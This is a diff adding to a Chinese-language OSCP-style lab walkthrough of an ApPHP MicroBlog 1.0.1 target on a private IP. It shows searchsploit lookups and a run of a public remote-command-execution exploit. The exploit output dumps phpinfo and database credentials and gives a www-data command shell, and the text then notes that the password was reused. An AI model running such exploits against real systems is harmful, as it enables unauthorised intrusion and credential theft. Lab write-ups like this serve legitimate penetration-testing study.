@@ -22,5 +22,78 @@
 # 目录扫描
 ```c
 http://192.168.44.139/README.txt
+
+// ApPHP MicroBlog Free
+// Version: 1.0.1
 ```
 
+# 漏洞扫描
+```c
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ searchsploit apphp                      
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+ApPHP MicroBlog 1.0.1 - Multiple Vulnerabi | php/webapps/33030.txt
+ApPHP MicroBlog 1.0.1 - Remote Command Exe | php/webapps/33070.py
+
+
+
+
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ searchsploit -m php/webapps/33030.txt  
+  Exploit: ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities
+      URL: https://www.exploit-db.com/exploits/33030
+     Path: /usr/share/exploitdb/exploits/php/webapps/33030.txt
+    Codes: OSVDB-106352, OSVDB-106351
+ Verified: True
+File Type: ASCII text
+Copied to: /home/kali/桌面/OSCP/33030.txt
+
+
+
+
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ python2 33070.py http://192.168.44.139/
+  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
+original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
+[*] Testing for vulnerability...
+[+] Website is vulnerable
+
+[*] Fecthing phpinfo
+        PHP Version 5.6.40-0+deb8u12
+        System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
+        Loaded Configuration File   /etc/php5/apache2/php.ini
+        Apache Version   Apache/2.4.10 (Debian)
+        User/Group   www-data(33)/33
+        Server Root   /etc/apache2
+        DOCUMENT_ROOT   /var/www/html
+        PHP Version   5.6.40-0+deb8u12
+        allow_url_fopen  On  On
+        allow_url_include  Off  Off
+        disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
+        open_basedir   no value    no value
+        System V Message based IPC   Wez Furlong
+        System V Semaphores   Tom May
+        System V Shared Memory   Christian Cartus
+
+[*] Fetching include/base.inc.php
+<?php
+                        // DATABASE CONNECTION INFORMATION
+                        define('DATABASE_HOST', 'localhost');           // Database host
+                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used
+                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database
+                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database
+                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key
+                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the database
+                        ?>
+
+[*] Testing remote execution
+[+] Remote exec is working with system() :)
+Submit your commands, type exit to quit
+> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+经过一番排查，我们发现用户clapton的密码被重复使用
